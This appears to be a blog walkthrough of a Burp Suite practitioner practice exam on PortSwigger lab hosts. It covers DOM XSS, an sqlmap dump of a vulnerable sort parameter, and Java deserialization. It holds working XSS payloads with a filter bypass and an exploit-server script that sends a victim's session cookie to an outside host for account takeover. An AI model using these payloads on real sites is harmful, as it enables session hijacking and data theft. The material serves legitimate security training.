# Burp Suite Certified Practitioner Exam Preparation Walkthrough

---
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true
title: Burp Suite Exam Prep !
header:
  image: /assets/images/post1/image.png
  teaser: /assets/images/post1/teaser.png
  
---


### **EXAM PREP**

**1/3: XSS**

DOM XSS in lookup function :

When the app is launched we immediatly see the search bar, what I always try is for XSS. 
I use the “Untrusted types” on Chrome. 

I put something in search and click on “search”

![untrusted.png](/assets/images/burp/untrusted.png)

By referring to DOM XSS labs on Portswigger, we see that there are 2 DOM XSS payloads who can work here : 

```jsx
\\"-alert(1)}//
or
"-alert(1)-"
```

XSS can be used to steal cookies of other users, then we need to try : 

```jsx
\\"-alert(document.cookie)}//
```

But no luck : 

![XSS blocked.png](/assets/images/burp/XSS_blocked.png)

We need to find a bypass and I found on the internet that we can bypass it by using : 

```jsx
\\"-alert(window["document"]["cookie"])}//
```

![XSS Bypassed.png](/assets/images/burp/XSS_Bypassed.png)

Now that we have the good payload we have to construct a payload with the exploit server link :

Add this code in exploit-server and 

```jsx
<script>

location='https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/?SearchTerm=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-0a6d00a40340d487c0a03af7016a000c%252eexploit-server%252enet%2F%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22';

</script>
```

![Capture d’écran 2023-02-03 à 14.05.12.png](/assets/images/burp/Capture_decran_2023-02-03_a_14.05.12.png)

We just have to replace the session cookie to have access to Carlos account. 

**2/3 SQL Injection**

We have access to a new feature : 

![AdvancedSearch.png](/assets/images/burp/AdvancedSearch.png)

We see a parameter ⇒ sorted-by vulnerable to SQLi

![VulnParam.png](/assets/images/burp/VulnParam.png)

I launched the sqlmap command below : 

```jsx
sqlmap -u "[https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE*](https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE*)" --cookie="_lab=46%7cMCwCFAuZTmvz13aVBBW1bpQM25dE2RVNAhRq8fmJk1vCl2i8uauGpq2N%2bIytqdEsQkFl0b%2b8pNzF%2f4p3No1yF19zA%2bj3GuVuecfTlUlSWFGu7SfWBmEz6Mu0JEWnJg5r4GggAibBFB9QtX0gMd%2fLhfFCfcTKNJtOaZ4mGvaUex6vw3k%3d; session=F8UksvHTO0lwQgGckaeEpePsgEJQTvs2" --dump
```

![SQLi result.png](/assets/images/burp/SQLi_result.png)

Now time to visit admin-panel and see what’s the next bug ! 

**3/3** ****DESERIALIZATION:****

Using Burp Scanner we can see that admin_pref are vulnerable :

![Launch Scan.png](/assets/images/burp/Launch_Scan.png)

![Burp Scan.png](/assets/images/burp/Burp_Scan.png)

Using Deserialization Scanner plugin on Burp gave me these informations : 

![JavaDeserialization.png](/assets/images/burp/JavaDeserialization.png)

Once the payload is generated and the request sent, we can go back to Burp Collaborator to see if we have a ping back : 

![Solution.png](/assets/images/burp/Solution.png)

BINGO ! We have then finished the lab. 

I hope you enjoyed reading this article as much as I enjoyed writing it.
